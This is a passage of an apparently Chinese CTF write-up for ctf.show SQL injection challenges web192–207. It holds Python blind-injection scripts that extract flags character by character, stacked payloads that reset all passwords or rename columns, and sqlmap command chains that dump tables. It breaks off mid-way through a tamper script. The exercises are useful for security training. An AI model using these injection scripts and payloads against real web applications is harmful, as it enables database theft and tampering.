<h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><h2 id="过滤ord和ascii函数"><a href="#过滤ord和ascii函数" class="headerlink" title="过滤ord和ascii函数"></a>过滤ord和ascii函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://00b9416c-a0a8-490b-b48b-b2ace6ec42b2.chall.ctf.show:8080/api/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    length=<span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag.lower())</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&quot; &quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">&quot;&#x27; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&lt;&#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h2 id="过滤sustr"><a href="#过滤sustr" class="headerlink" title="过滤sustr"></a>过滤sustr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;</span>:</span><br><span class="line">        <span class="comment">#payload=&quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment">#payload=&quot;&#x27; or if((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        payload=<span class="string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(flag+j+<span class="string">&quot;%&quot;</span>)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;(select group_concat(f1ag) from ctfshow_fl0g)&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((<span class="subst">&#123;payload&#125;</span>)regexp(&#x27;<span class="subst">&#123;flag +j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><h2 id="locat-正则注入"><a href="#locat-正则注入" class="headerlink" title="locat()正则注入"></a>locat()正则注入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE</span></span><br><span class="line">url = <span class="string">&quot;http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;</span></span><br><span class="line">final = <span class="string">&quot;&quot;</span></span><br><span class="line">stttr = <span class="string">&quot;flag&#123;&#125;-_1234567890qwertyuiopsdhjkzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> stttr:</span><br><span class="line">        final += j</span><br><span class="line">        <span class="comment"># 查表名-ctfshow_flxg</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;final&#125;&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment"># 查字段-f1ag</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;final&#125;&#x27;,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27; limit 1,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(locate(&#x27;<span class="subst">&#123;final&#125;</span>&#x27;,(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(final)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            final = final[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h2 id="update堆叠注入"><a href="#update堆叠注入" class="headerlink" title="update堆叠注入"></a>update堆叠注入</h2><p>把所有的密码都改为111，之后登录就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x61646d696e;update`ctfshow_user`set`pass`=0x313131;</span><br><span class="line"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span><br><span class="line">sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407180508467.png" alt="image-20220407180508467"></p>
<h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407180601416.png" alt="image-20220407180601416"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line">if(preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;, $username))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可能是过滤错了吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;select(1)</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407180656002.png" alt="image-20220407180656002"></p>
<h1 id="web197-198"><a href="#web197-198" class="headerlink" title="web197-198"></a>web197-198</h1><h2 id="alter更改列名堆叠注入"><a href="#alter更改列名堆叠注入" class="headerlink" title="alter更改列名堆叠注入"></a>alter更改列名堆叠注入</h2><p>利用alter更改列名。一开始想着把username更改为pass，然后查出来的就是字符串用户名，和数字0进行弱类型比较就可以了，但是实际尝试发现不行，看了一下发现这题没有检查传入的password是不是数字，而且没有用intval对password进行处理，所以这样不行，那就把id改成pass，然后爆破id就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;alter table `ctfshow_user` change `pass` `feng` varchar(255); alter table `ctfshow_user` change `id` `pass` varchar(255)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;varchar(255);&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;0x61646d696e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#登陆成功 flag is ctfshow&#123;1e8cd464-117c-4863-a8ea-0e7b83d3d9fe&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><h2 id="堆叠登录"><a href="#堆叠登录" class="headerlink" title="堆叠登录"></a>堆叠登录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables</span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure>

<p>show tables;会显示表名,也就是ctfshow_user那么这个时候会将查出来的这个值当成密码,也就是密码为ctfshow_user</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407182514272.png" alt="image-20220407182514272"></p>
<h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h2 id="改referer"><a href="#改referer" class="headerlink" title="改referer"></a>改referer</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探测注入点</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --dbs --batch</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; --tables --batch</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user --columns --batch</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user -C &quot;pass&quot; --dump --batch</span><br></pre></td></tr></table></figure>

<h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --dbs --batch</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web --tables --batch</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user --columns --batch</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure>

<h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>必须要加index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --dbs --batch</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web --tables --batch</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --columns --batch</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure>

<h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h2 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://4d60760f-5063-4ed9-9221-e282903a6cd9.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=eq5fptfudtbh83i0c0cefg944a; ctfshow=0b535f51ad8cd475e68035ffa3f7fdf7&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure>

<h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h2 id="访问安全链接"><a href="#访问安全链接" class="headerlink" title="访问安全链接"></a>访问安全链接</h2><p>可以发现查询数据时先去访问了getToken.php,接着才是查询数据</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407200618827.png" alt="image-20220407200618827"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line"> --safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax -C flagx --dump</span><br></pre></td></tr></table></figure>

<h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</span><br></pre></td></tr></table></figure>

<h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h2 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>mytamper.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW <span class="comment"># 当前脚本调用优先等级</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>(): <span class="comment"># 声明当前脚本适用/不适用的范围，可以为空。</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> 